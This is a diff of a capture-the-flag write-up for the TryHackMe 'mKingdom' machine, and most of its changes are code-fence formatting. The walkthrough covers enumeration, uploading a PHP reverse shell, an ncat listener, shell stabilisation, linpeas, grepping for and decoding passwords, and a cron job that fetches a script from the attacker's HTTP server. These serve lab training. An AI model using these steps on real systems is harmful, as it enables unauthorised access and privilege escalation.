@@ -28,7 +28,7 @@ We see only an HTTP server running on port 85, which is not the standard port 80
 
 If your machine returns an open port, you can still gather more information about this webserver with the following command:
 
-```bash
+```
 nmap -sC -sV -Pn 10.10.226.51 -p 85
 ```
 
@@ -41,15 +41,15 @@ ___
 # Webserver Enumeration
 I always add the server IP to my ```/etc/hosts``` file and I recomment you doing the same:
 
-``
+```
 sudo nano /etc/hosts
-``
+```
 
 And add this line to your hosts (change the IP to your target machine address!)
 
-``
+```
 10.10.226.51    mkingdom.thm
-``
+```
 
 When navigating in your web browser to ```http://mkingdom.thm:85/```. you should see the following page. It looks like the main page was defaced, so we need to find another way into the main website.
 
@@ -71,15 +71,15 @@ ___
 
 We run Gobuster to find any directories. I like to start with a small wordlist first, and if it comes up empty, I do an extension search:
 
-``
+```
 gobuster dir -u http://mkingdom.thm:85 -w /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt
-``
+```
 
 We find one directory immediately. If you let the full scan run, it doesn't show anything else. 
 
-``
+```
 /app                  (Status: 301) [Size: 312] [--> http://mkingdom.thm:85/app/]
-``
+```
 
 When we open this web folder, we only see a green button with ```JUMP``` on it. Clicking it will redirect us to the main page. (Don't forget to look at the source code as well! But still nothing interesting.)
 
@@ -168,9 +168,9 @@ I hit my wall out of frustration and went on to upload my PHP shell.
 
 Because the webserver is the only service running on the machine, the PHP shell will be my only way to control the machine. I generated a [PHP Pentestmonkey reverse shell](https://www.revshells.com/), saved it and looked again at [the guide from earlier](https://vulners.com/hackerone/H1:768322). It's not that hard to do. Just follow the guide, and you will have your shell up in no time (don't forget to whitelist the php extention under ```System & Setting > Files > Allowed File Types```). When uploading the file, click on close when the bar under the uploaded shell turns green. Start a netcat listener and click the link after you uploaded your shell.
 
-``
+```
 ncat -lvnp 8888 (or any other Lport you want to use. Make sure it is the same as in your php shell script!)
-``
+```
 
 ![alt_text](https://raw.githubusercontent.com/SpongySystems/spongysystems.github.io/master/images/mkingdom/shell_link.png)
 
@@ -178,16 +178,16 @@ ___
 
 Now that we have access, we need to stabilize the shell. In your Netcat listener, copy and paste the following lines:
 
-```bash
+```
 python3 -c 'import pty;pty.spawn("/bin/bash")'
 export TERM=xterm
 ```
 
 Next, hit 'Ctrl + Z' to put the Netcat listener in the background (don't worry, it is still running, but you need to paste the following command in your own terminal on the same window that Netcat is running):
 
-``
+```
 stty raw -echo; fg
-``
+```
 
 Hit 'Enter' twice and now we have a shell that mimics all the nice functionalities of a normal terminal window. Time to enumerate the system and see if we can escalate our privileges to a user. Good luck!
 
@@ -215,9 +215,9 @@ I ran [```linpeas.sh```](https://github.com/peass-ng/PEASS-ng/tree/master/linPEA
 
 On attacker machine:
 
-``
+```
 cp linpeas.sh linpeas.txt
-``
+```
 
 Upload this ```linpeas.txt``` file to the webserver, and on the victim machine do:
 
@@ -229,9 +229,9 @@ mv linpeas.txt linpeas.sh
 
 This will take a minute. Wait, then download the ```peas.txt``` file on the attacker machine:
 
-``
+```
 wget http://mkingdom.thm:85/app/castle/application/files/path/to/peas.txt
-``
+```
 
 You can also view the output on the victim machine, but I like to have the ```linpeas``` output open in a separate terminal window.
 
@@ -241,9 +241,9 @@ Linpeas generates a big file with a lot of information. Use ```cat``` to display
  <summary>Need a hint?</summary>
  One output is marked in yellow and should be easy to find. The other one is very valuable. You can try the following command for a more focused search:
  
- ``
+ ```
  cat peas.txt | grep password -n
- ``
+ ```
  
  This will give you output with line numbers. If you see something interesting, you can use ```cat -n peas.txt``` to display the whole file with line numbers, allowing you to easily navigate to the line you want to know more about.
 </details>
@@ -304,9 +304,9 @@ drwxr-xr-x  2 toad toad 4096 Nov 26  2023 Videos
 
 Hmm... no userflag here. But we do have an ```smb.txt``` file. There doesn't seem to be an SMB server running on this system, but maybe we need to find another system?
 
-``
+```
 cat smb.txt
-``
+```
 
 ```bash
 Save them all Mario!
@@ -377,9 +377,9 @@ aWthVGVOVEFOdEVTCg==
 
 Yup, it is the same. The two ```==``` symbols indicate this string of letters is encoded in ```base64```. ```Base64``` takes three characters and encodes them into four characters. When a string is not a multiple of three, it uses the ```=``` character at the end as padding to fill up leftover bytes. This way the message can be correctly decoded. Let's decode it now.
 
-``
+```
 toad@mkingdom:~$ echo $PWD_token | base64 --decode
-``
+```
 
 We got something that looks like a possible password. But if you try to use this to log in as the root user, it fails. What other user could this be for?
 
@@ -573,9 +573,9 @@ Change the IP address to your own IP address on the TryHackMe vpn. Leave one tab
 
 Hit ```Ctrl+X```, ```Y``` and ```Enter```. This will save the file. Restart they python webserver on port 85 on your attacker machine. We need to listen on this port, because the cron
 
-``
+```
 python3 -m http.server 5555
-``
+```
 
 If you did it correctly, you should see failed connection attempts on the webserver (because the ```counter.sh``` file does not yet exist on our webserver)
 
